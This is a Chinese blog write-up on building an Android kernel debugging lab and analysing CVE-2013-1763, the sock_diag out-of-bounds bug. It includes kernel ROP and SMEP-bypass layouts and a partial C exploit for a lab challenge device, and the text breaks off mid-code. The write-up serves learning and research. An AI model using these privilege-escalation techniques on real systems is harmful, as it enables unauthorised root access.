<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.0"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>搭建android内核环境（顺带分析cve-2013-1763) - Dawuge&#039;s blog</title><meta description="本来是想尝试在android下复现，但最后还是只在linux下复现成功了，可能还是出现了些纰漏的地方"><meta property="og:type" content="blog"><meta property="og:title" content="搭建android内核环境（顺带分析cve-2013-1763)"><meta property="og:url" content="http://yoursite.com/2020/03/01/%E6%90%AD%E5%BB%BAandroid%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83(%E9%A1%BA%E5%B8%A6%E5%88%86%E6%9E%90cve-2013-1763)/"><meta property="og:site_name" content="Dawuge&#039;s blog"><meta property="og:description" content="本来是想尝试在android下复现，但最后还是只在linux下复现成功了，可能还是出现了些纰漏的地方"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://yoursite.com/2020/03/01/%E6%90%AD%E5%BB%BAandroid%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83(%E9%A1%BA%E5%B8%A6%E5%88%86%E6%9E%90cve-2013-1763)/upload/attach/202003/837839_RA8572XZGRMAT5K.png"><meta property="og:image" content="http://yoursite.com/2020/03/01/%E6%90%AD%E5%BB%BAandroid%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83(%E9%A1%BA%E5%B8%A6%E5%88%86%E6%9E%90cve-2013-1763)/upload/attach/202003/837839_7B9BEAB56M37JCR.png"><meta property="og:image" content="http://yoursite.com/2020/03/01/%E6%90%AD%E5%BB%BAandroid%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83(%E9%A1%BA%E5%B8%A6%E5%88%86%E6%9E%90cve-2013-1763)/upload/attach/202003/837839_28A6SD38VNU7N8U.png"><meta property="article:published_time" content="2020-02-29T16:00:00.000Z"><meta property="article:modified_time" content="2020-02-29T16:00:00.000Z"><meta property="article:author" content="Dawuge"><meta property="article:tag" content="vul"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="upload/attach/202003/837839_RA8572XZGRMAT5K.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2020/03/01/%E6%90%AD%E5%BB%BAandroid%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83(%E9%A1%BA%E5%B8%A6%E5%88%86%E6%9E%90cve-2013-1763)/"},"headline":"Dawuge's blog","image":["http://yoursite.com/2020/03/01/%E6%90%AD%E5%BB%BAandroid%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83(%E9%A1%BA%E5%B8%A6%E5%88%86%E6%9E%90cve-2013-1763)/upload/attach/202003/837839_RA8572XZGRMAT5K.png","http://yoursite.com/2020/03/01/%E6%90%AD%E5%BB%BAandroid%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83(%E9%A1%BA%E5%B8%A6%E5%88%86%E6%9E%90cve-2013-1763)/upload/attach/202003/837839_7B9BEAB56M37JCR.png","http://yoursite.com/2020/03/01/%E6%90%AD%E5%BB%BAandroid%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83(%E9%A1%BA%E5%B8%A6%E5%88%86%E6%9E%90cve-2013-1763)/upload/attach/202003/837839_28A6SD38VNU7N8U.png"],"datePublished":"2020-02-29T16:00:00.000Z","dateModified":"2020-02-29T16:00:00.000Z","author":{"@type":"Person","name":"Dawuge"},"description":"本来是想尝试在android下复现，但最后还是只在linux下复现成功了，可能还是出现了些纰漏的地方"}</script><link rel="canonical" href="http://yoursite.com/2020/03/01/%E6%90%AD%E5%BB%BAandroid%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83(%E9%A1%BA%E5%B8%A6%E5%88%86%E6%9E%90cve-2013-1763)/"><link rel="icon" href="/img/kkx.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/kkx.png" alt="Dawuge&#039;s blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/categories/notes">Notes</a><a class="navbar-item" href="/categories/ctf">CTF</a><a class="navbar-item" href="/categories/vul">Linux</a><a class="navbar-item" href="/categories/vul/android">Android</a><a class="navbar-item" href="/categories/fuzz">Fuzz</a></div><div class="navbar-end"><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2020-02-29T16:00:00.000Z" title="2020-02-29T16:00:00.000Z">2020-03-01</time><span class="level-item"><a class="link-muted" href="/categories/vul/">vul</a><span> / </span><a class="link-muted" href="/categories/vul/android/">android</a><span> / </span><a class="link-muted" href="/categories/vul/android/kernel/">kernel</a></span><span class="level-item">21 分钟 读完 (大约 3113 个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">搭建android内核环境（顺带分析cve-2013-1763)</h1><div class="content"><p>本来是想尝试在android下复现，但最后还是只在linux下复现成功了，可能还是出现了些纰漏的地方</p>
<a id="more"></a>
<p>以前搭建过linux的内核环境，当时是为了做kernel pwn搭建的，但是尝试复现android kernel的漏洞，虽说原理相同，但还是重新搭建了新的环境。</p>
<p>搭建环境的步骤基本没遇到什么大坑，跟着<a href="https://github.com/Fuzion24/AndroidKernelExploitationPlayground">这个库</a>走基本就没遇到什么大坑</p>
<ul>
<li>配置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">playground</span><br><span class="line">├── android-sdk-linux</span><br><span class="line">├── arm-linux-androideabi-4.6</span><br><span class="line">├── goldfish</span><br><span class="line">└── kernel_exploit_challenges</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;aosp.tuna.tsinghua.edu.cn&#x2F;platform&#x2F;prebuilts&#x2F;gcc&#x2F;linux-x86&#x2F;arm&#x2F;arm-linux-androideabi-4.6</span><br><span class="line">git clone https:&#x2F;&#x2F;aosp.tuna.tsinghua.edu.cn&#x2F;kernel&#x2F;goldfish &amp;&amp; \</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Fuzion24&#x2F;AndroidKernelExploitationPlayground.git kernel_exploit_challenges &amp;&amp; \</span><br><span class="line">cd goldfish &amp;&amp; git checkout -t origin&#x2F;android-goldfish-3.4 &amp;&amp; \</span><br><span class="line">git am --signoff &lt; ..&#x2F;kernel_exploit_challenges&#x2F;kernel_build&#x2F;debug_symbols_and_challenges.patch &amp;&amp; \</span><br><span class="line">cd .. &amp;&amp; ln -s $(pwd)&#x2F;kernel_exploit_challenges&#x2F; goldfish&#x2F;drivers&#x2F;vulnerabilities</span><br></pre></td></tr></table></figure>

<h3 id="搭建内核"><a href="#搭建内核" class="headerlink" title="搭建内核"></a>搭建内核</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export ARCH&#x3D;arm SUBARCH&#x3D;arm CROSS_COMPILE&#x3D;arm-linux-androideabi- &amp;&amp;\</span><br><span class="line">export PATH&#x3D;$(pwd)&#x2F;arm-linux-androideabi-4.6&#x2F;bin&#x2F;:$PATH &amp;&amp; \</span><br><span class="line">cd goldfish &amp;&amp; make goldfish_armv7_defconfig &amp;&amp; make -j8</span><br></pre></td></tr></table></figure>

<p>编译完成后，就会有两个主要的文件：goldfish/vmlinux 和 goldfish/arch/arm/boot/zImage。前面那个用于在调试时 gdb加载，后面的用于在安卓模拟器启动时加载。<br>vmlinux 用于提供符号表，zImage 则用于运行环境</p>
<p>然后下载或者编译sdk，下载完成后解压并将 android-sdk-linux/tools 加入环境变量（.bashrc）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;dl.google.com&#x2F;android&#x2F;android-sdk_r24.4.1-linux.tgz</span><br><span class="line">tar xvf android-sdk_r24.4.1-linux.tgz</span><br><span class="line">export PATH&#x3D;YOURPATH&#x2F;android-sdk-linux&#x2F;tools:$PATH</span><br></pre></td></tr></table></figure>
<p>还要下jdk<br>在终端中输入 android，下载我们需要的 SDK 和系统镜像</p>
<p> <img src="upload/attach/202003/837839_RA8572XZGRMAT5K.png" alt=""></p>
<h3 id="运行模拟器"><a href="#运行模拟器" class="headerlink" title="运行模拟器"></a>运行模拟器</h3><p>创建模拟器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android create avd --force -t &quot;android-19&quot; -n kernel_challenges</span><br></pre></td></tr></table></figure>
<p>其选项按需求选择，反正我一开始是一路enter的。。。</p>
<p>接下来进入 goldfish 目录，执行下面的命令用我们的内核运行模拟器，并在 1234 端口 起一个 gdbserver 方便内核调试。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emulator -show-kernel -kernel arch&#x2F;arm&#x2F;boot&#x2F;zImage -avd kernel_challenges -no-boot-anim -no-skin -no-audio -no-window -qemu -monitor unix:&#x2F;tmp&#x2F;qemuSocket,server,nowait -s</span><br></pre></td></tr></table></figure>

<p>再开一个 shell，进入 goldfish 目录，加载 vmlinux 以便调试内核：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arm-linux-androideabi-gdb vmlinux</span><br></pre></td></tr></table></figure>
<p>这里的gdb注意因为前面export path了，所以实际路径是在arm-linux-androideabi-4.6/bin里</p>
<p>出现arm-linux-androideabi-gdb: error while loading shared libraries: libpython2.6.so.1.0: cannot open shared object file: No such file or directory问题时用以下方法即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpython2.7.so &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libpython2.6.so.1.0</span><br></pre></td></tr></table></figure>

<p>这样基本上就可以调试内核了。。</p>
<p>整体来说不太复杂，就是拖文件够呛，网络太差了orz<br>之前调试kernel pwn题的时候还要烦些，后来用了两种方式搞定kernel环境，一是在虚拟机里搞定后再在本机的vscode 用ssh连接虚拟机，就实现了在vscode边写代码边测试的路子（很舒服），后来还是觉得麻烦因为要关hyper，不能使用wsl处理一般事务，于是就直接在我的pwn docker里直接搭建环境也成功了，然后再用docker共享文件也实现了边写代码边测试的路子（更舒服而且cpu的负荷啥的也小），具体搭建kernel环境的步骤不再累述，网上很多。</p>
<h2 id="二更：分析了cve-2013-1763-还是踩了一些坑"><a href="#二更：分析了cve-2013-1763-还是踩了一些坑" class="headerlink" title="二更：分析了cve-2013-1763, 还是踩了一些坑"></a>二更：分析了cve-2013-1763, 还是踩了一些坑</h2><p>放一下一些内核的安全利用点(很不全），可以直接看ctf wiki或者其他的类似博客，大佬略过即可</p>
<p><strong>KASLR</strong><br>内核地址空间随机化。<br>内核地址显示限制<br>即kptr_ restrict指示是否限制通过/ proc和其他接口暴露内核地址。<br>0：默认情况下，没有任何限制。<br>1：使用％pK格式说明符打印的内核指针将被替换为0，除非用户具有CAP_ SYSLOG特权<br>2：使用％pK打印的内核指针将被替换为0而不管特权。</p>
<p>也就是说，当kptr_ restrict被限制的时候我们不能直接通过cat /proc/kallsyms来获得commit_creds的地址，要禁用该限制使用下面的命令：<br>sudo sysctl -w kernel.kptr_restrict=0</p>
<p>内核的rop</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">|----------------------|</span><br><span class="line">| pop rdi; ret         |&lt;&#x3D;&#x3D; low mem</span><br><span class="line">|----------------------|</span><br><span class="line">| NULL                 |</span><br><span class="line">|----------------------|</span><br><span class="line">| addr of              |</span><br><span class="line">| prepare_kernel_cred()|</span><br><span class="line">|----------------------|</span><br><span class="line">| mov rdi, rax; ret    |</span><br><span class="line">|----------------------|</span><br><span class="line">| addr of              |</span><br><span class="line">| commit_creds()       |&lt;&#x3D;&#x3D; high mem</span><br><span class="line">|----------------------|</span><br></pre></td></tr></table></figure>
<p><strong>smep</strong><br>smep位于CR4寄存器的第20位，设置为1。CR4寄存器的值：0x1407f0 = 0001 0100 0000 0111 1111 0000<br>关闭SMEP方法<br>修改/etc/default/grub文件中的GRUB_CMDLINE_LINUX=””，加上nosmep/nosmap/nokaslr，然后update-grub就好</p>
<p><strong>绕过smep的方法</strong><br>由于我们只能在内核空间执行代码，但是不能把ROP链放到内核空间中，所以只能用stack pivot把ROP链放到用户空间。然后在内核空间找到合适的gadget放到ROP链中<br><strong>stack pivot</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rXx, rsp ; ret</span><br><span class="line">add rsp, ...; ret</span><br><span class="line">xchg rXx, rsp ; ret(xchg eXx, esp ; ret)</span><br><span class="line">xchg rsp, rXx ; ret(xchg esp, eXx ; ret)</span><br></pre></td></tr></table></figure>

<p>还有一种比较简单的绕过SMEP的方法是使用ROP翻转CR4的第20位并禁用SMEP，然后再执行commit_creds(prepare_kernel_cred(0))获取root权限。<br>如下构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">offset of rip</span><br><span class="line">pop rdi; ret</span><br><span class="line">mov CR4, rdi; ret</span><br><span class="line">commit_creds(prepare_kernel_cred(0))</span><br><span class="line">swapgs</span><br><span class="line">iretq</span><br><span class="line">RIP</span><br><span class="line">CS</span><br><span class="line">EFLAGS</span><br><span class="line">RSP</span><br><span class="line">SS</span><br></pre></td></tr></table></figure>

<p>漏洞的问题点其实不难，做过一点pwn的师傅们都能看的出来是个OOB类型的漏洞，简要分析下<br>先看patch，发现增加了个对req-&gt;sdiag_family的大小检查，于是定位到这个函数。<br> <img src="upload/attach/202003/837839_7B9BEAB56M37JCR.png" alt=""></p>
<p>发现外面还有个封装，不难看出要触发这个函数需要nlh的nlmsg_type类型为SOCK_DIAG_BY_FAMILY    </p>
<p> <img src="upload/attach/202003/837839_28A6SD38VNU7N8U.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">static int sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)</span><br><span class="line">&#123;</span><br><span class="line">	int ret;</span><br><span class="line"></span><br><span class="line">	switch (nlh-&gt;nlmsg_type) &#123;</span><br><span class="line">	case TCPDIAG_GETSOCK:</span><br><span class="line">	case DCCPDIAG_GETSOCK:</span><br><span class="line">		if (inet_rcv_compat &#x3D;&#x3D; NULL)</span><br><span class="line">			request_module(&quot;net-pf-%d-proto-%d-type-%d&quot;, PF_NETLINK,</span><br><span class="line">					NETLINK_SOCK_DIAG, AF_INET);</span><br><span class="line"></span><br><span class="line">		mutex_lock(&amp;sock_diag_table_mutex);</span><br><span class="line">		if (inet_rcv_compat !&#x3D; NULL)</span><br><span class="line">			ret &#x3D; inet_rcv_compat(skb, nlh);</span><br><span class="line">		else</span><br><span class="line">			ret &#x3D; -EOPNOTSUPP;</span><br><span class="line">		mutex_unlock(&amp;sock_diag_table_mutex);</span><br><span class="line"></span><br><span class="line">		return ret;</span><br><span class="line">	case SOCK_DIAG_BY_FAMILY:</span><br><span class="line">		return __sock_diag_rcv_msg(skb, nlh);</span><br><span class="line">	default:</span><br><span class="line">		return -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以在<a href="http://man7.org/linux/man-pages/man7/netlink.7.html">linux手册上</a>看到nlmsghdr结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct nlmsghdr &#123;</span><br><span class="line">   __u32 nlmsg_len;    &#x2F;* Length of message including header *&#x2F;</span><br><span class="line">   __u16 nlmsg_type;   &#x2F;* Type of message content *&#x2F;</span><br><span class="line">   __u16 nlmsg_flags;  &#x2F;* Additional flags *&#x2F;</span><br><span class="line">   __u32 nlmsg_seq;    &#x2F;* Sequence number *&#x2F;</span><br><span class="line">   __u32 nlmsg_pid;    &#x2F;* Sender port ID *&#x2F;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">nlmsg_type can be one of the standard message types: NLMSG_NOOP mes‐</span><br><span class="line">sage is to be ignored, NLMSG_ERROR message signals an error and the</span><br><span class="line">payload contains an nlmsgerr structure, NLMSG_DONE message terminates</span><br><span class="line">a multipart message.</span><br></pre></td></tr></table></figure>

<p>要想调用到该结构体，需要使用NETLINK_SOCK_DIAG协议的Netlink套接字发送消息，具体可参考<a href="http://edsionte.com/techblog/archives/4140">netlink编程</a>或<a href="https://my.oschina.net/longscu/blog/59534">Netlink Socket</a>，这里就不再累述。</p>
<p>再看__sock_diag_rcv_msg函数，可以知道，如果没有patch，那么在sock_diag_lock_handler的参数我们可以调用超过AF_MAX大小的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)</span><br><span class="line">&#123;</span><br><span class="line">	int err;</span><br><span class="line">	struct sock_diag_req *req &#x3D; nlmsg_data(nlh);</span><br><span class="line">	const struct sock_diag_handler *hndl;</span><br><span class="line"></span><br><span class="line">	if (nlmsg_len(nlh) &lt; sizeof(*req))</span><br><span class="line">		return -EINVAL;</span><br><span class="line"></span><br><span class="line">	if (req-&gt;sdiag_family &gt;&#x3D; AF_MAX)</span><br><span class="line">		return -EINVAL;</span><br><span class="line"></span><br><span class="line">	hndl &#x3D; sock_diag_lock_handler(req-&gt;sdiag_family);</span><br><span class="line">	if (hndl &#x3D;&#x3D; NULL)</span><br><span class="line">		err &#x3D; -ENOENT;</span><br><span class="line">	else</span><br><span class="line">		err &#x3D; hndl-&gt;dump(skb, nlh);</span><br><span class="line">	sock_diag_unlock_handler(hndl);</span><br><span class="line"></span><br><span class="line">	return err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再看sock_diag_lock_handler以及sock_diag_handlers函数组的定义，发现在这里就出现了OOB的问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">static const inline struct sock_diag_handler *sock_diag_lock_handler(int family)</span><br><span class="line">&#123;</span><br><span class="line">	if (sock_diag_handlers[family] &#x3D;&#x3D; NULL)</span><br><span class="line">		request_module(&quot;net-pf-%d-proto-%d-type-%d&quot;, PF_NETLINK,</span><br><span class="line">				NETLINK_SOCK_DIAG, family);</span><br><span class="line"></span><br><span class="line">	mutex_lock(&amp;sock_diag_table_mutex);</span><br><span class="line">	return sock_diag_handlers[family];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static const struct sock_diag_handler *sock_diag_handlers[AF_MAX];</span><br></pre></td></tr></table></figure>

<p>根据上面的一些介绍和链接参考基本上就能知道要如何去构造而exp了, 我看网络上公布的exp大致原理相同，可参考<a href="http://www.exploit-db.com/exploits/24555">1</a>,<a href="http://www.exploit-db.com/exploits/24746">2</a>,<a href="http://www.exploit-db.com/exploits/33336">3</a>，而<br>AndroidKernelExploitationPlayground是自己实现了个类似的漏洞，大致原理原理类似，但无需构造socket去与他交互和填充具体的结构体数值，更加好理解些。<br>exp的分析一起写在代码里了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;strings.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line">#include &quot;..&#x2F;..&#x2F;module&#x2F;CommandHandler.h&quot;</span><br><span class="line">#include &quot;dbg.h&quot;</span><br><span class="line"></span><br><span class="line">__u32</span><br><span class="line">get_symbol(char *name)</span><br><span class="line">&#123;</span><br><span class="line">        FILE *f;</span><br><span class="line">        __u32 addr;</span><br><span class="line">        char dummy, sname[512];</span><br><span class="line">        int ret &#x3D; 0;</span><br><span class="line">        </span><br><span class="line">        &#x2F;&#x2F;在&#x2F;proc&#x2F;kallsyms文件中存放着结构体的地址，需要读取用来先对偏移</span><br><span class="line">        &#x2F;&#x2F;如果系统开启了内核地址显示限制可以用这个命令禁用</span><br><span class="line">        &#x2F;&#x2F;sudo sysctl -w kernel.kptr_restrict&#x3D;0</span><br><span class="line">        f &#x3D; fopen(&quot;&#x2F;proc&#x2F;kallsyms&quot;, &quot;r&quot;);</span><br><span class="line">        if (!f) &#123;</span><br><span class="line">                return 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while (ret !&#x3D; EOF) &#123;</span><br><span class="line">                ret &#x3D; fscanf(f, &quot;%p %c %s\n&quot;, (void **) &amp;addr, &amp;dummy, sname);</span><br><span class="line">                if (ret &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                        fscanf(f, &quot;%s\n&quot;, sname);</span><br><span class="line">                        continue;</span><br><span class="line">                &#125;</span><br><span class="line">                if (!strcmp(name, sname)) &#123;</span><br><span class="line">                        printf(&quot;[+] resolved symbol %s to %p\n&quot;, name, (void *) addr);</span><br><span class="line">                        return addr;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__u32 commit_creds;</span><br><span class="line">__u32 prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;基本思路一样的，都是最终调用commit_creds(prepare_kernel_cred(0));</span><br><span class="line">    commit_creds &#x3D;  get_symbol(&quot;commit_creds&quot;);</span><br><span class="line">    prepare_kernel_cred &#x3D; get_symbol(&quot;prepare_kernel_cred&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;这个是封装在AndroidKernelExploitationPlayground环境内的漏洞文件位置（这里和其他的exp不同，重点没有去构造socket与其交互，而是直接用其自己实现的伪“函数”，然后用ioctl与其交互。</span><br><span class="line"></span><br><span class="line">    int cmd_handler &#x3D; open(&quot;&#x2F;dev&#x2F;array_index&quot;, O_RDWR);</span><br><span class="line">    check(cmd_handler &gt;&#x3D; 0, &quot;Error opening challenge device&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;这里就是构造一块可入可写可执行的用户空间，在这段空间内布置rop链</span><br><span class="line">    __u32 mmap_start &#x3D; 0x02000000, mmap_size &#x3D; 0x15000;</span><br><span class="line"></span><br><span class="line">    printf(&quot;[+] Mapping userspace memory at 0x%x\n&quot;, mmap_start);</span><br><span class="line"></span><br><span class="line">    void * mapped &#x3D; mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,</span><br><span class="line">        MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);</span><br><span class="line">        check(mapped !&#x3D; MAP_FAILED, &quot;Failed mapping&quot;);</span><br><span class="line"></span><br><span class="line">     &#x2F;&#x2F;0x00000000 is nop for ARM</span><br><span class="line">        bzero( (void*)mmap_start, mmap_size );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;这里是arm上的exp，学过arm pwn的师傅们应该也不觉得陌生</span><br><span class="line">    